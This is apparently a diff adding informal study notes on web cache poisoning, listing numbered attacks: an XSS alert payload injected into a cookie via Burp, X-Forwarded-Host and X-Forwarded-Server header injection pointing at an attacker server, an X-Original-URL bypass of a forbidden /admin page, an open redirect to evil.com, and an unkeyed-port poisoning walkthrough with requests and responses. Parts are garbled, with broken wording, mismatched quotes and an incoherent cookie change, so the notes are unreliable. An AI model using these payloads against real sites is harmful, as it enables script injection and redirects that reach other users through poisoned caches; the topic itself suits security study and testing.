@@ -1,0 +1,58 @@
+first  cacha the request in burp for first time than forwardit it after that .that request will be in history tap open that  in cookie value you can see sid:en in responces tap you can see the cookie value with "sid:en" change it to "sid:en"alert('sxs');"sometext
+
+
+attack :1
+X-Forwarded-Host: xyz
+X-Forwarded-Scheme: nohttps
+ attack :2
+ X-Forwarded-Server: candry
+ you can register your own server like sury.com in that you can <script> alert(0)</script>
+ X-Forwarded-Server: sury.com
+
+ attack: 3
+ GET /admin ==> if you get 403  forbiden 
+ 
+
+ GET /search/node?key=sniff
+ Host: www.vidhvaa.com
+ X-Orginal-URL: /search/node?key=kittana
+
+
+ Location: http://vidhvaa.com/@drupal.com ==> its just a open redirect 
+
+ attack: 4
+ GET /foo.js?v=1
+
+ GET /foo.js?destination=https://evil.com/@domain.com
+ host:www.vidhvaa.com
+ X-Orginal-URL: /foo.js?v=1
+ 
+
+attack :5
+   Let's say that our hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the Host header to dynamically generate the Location header in the response:
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 302 Moved Permanently
+Location: https://vulnerable-website.com/en
+Cache-Status: miss
+
+To test whether the port is excluded from the cache key, we first need to request an arbitrary port and make sure that we receive a fresh response from the server that reflects this input:
+
+GET / HTTP/1.1
+Host: vulnerable-website.com:1337
+
+HTTP/1.1 302 Moved Permanently
+Location: https://vulnerable-website.com:1337/en
+Cache-Status: miss
+
+Next, we'll send another request, but this time we won't specify a port:
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 302 Moved Permanently
+Location: https://vulnerable-website.com:1337/en
+Cache-Status: hit 
+
